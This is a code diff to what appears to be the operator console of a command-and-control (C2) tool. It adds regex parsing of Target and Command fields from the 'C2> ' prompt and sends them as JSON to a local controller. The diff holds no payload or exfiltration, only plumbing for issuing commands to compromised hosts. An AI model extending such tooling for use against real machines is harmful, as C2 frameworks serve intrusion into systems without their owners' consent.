@@ -3,6 +3,7 @@ from C2 import *
 import socket
 import sys
 import json
+import re
 
 cli = socket.socket()
 cli.connect(('127.0.0.1', CTRL_PORT))
@@ -23,6 +24,7 @@ def recvStr():
 
 def clientInterface():
     jsonObj = {}
+    print(cli.getpeername())
     jsonObj["Target"] = str(cli.getpeername())
     jsonObj["Command"] = "List Connections"
     sendStr(json.dumps(jsonObj))
@@ -31,8 +33,16 @@ def clientInterface():
     jsonObj["Command"] = "test queue"
     print(json.dumps(jsonObj))
     while True:
-        Command = input("C2> ")
-        sendStr(Command)
+        Com = input("C2> ")
+        print(Com)
+        tgt = re.match(r".*Target\s*=\s*(\(.*\)|\*).*",Com)
+        c = re.match(r".*Command\s*=\s*(\".*\"|\S*).*", Com)
+        Target = str(tgt.groups()[0])
+        Command = str(c.groups()[0].replace("\"", ""))
+        sendStr("{ \"Target\": \""+ Target +"\", \"Command\": \"" + Command +"\"}" )
+        #print(Command)
+        #print (command.groups()[0])
+        #sendStr(str(Command))
         print(recvStr())
     cli.close()
 
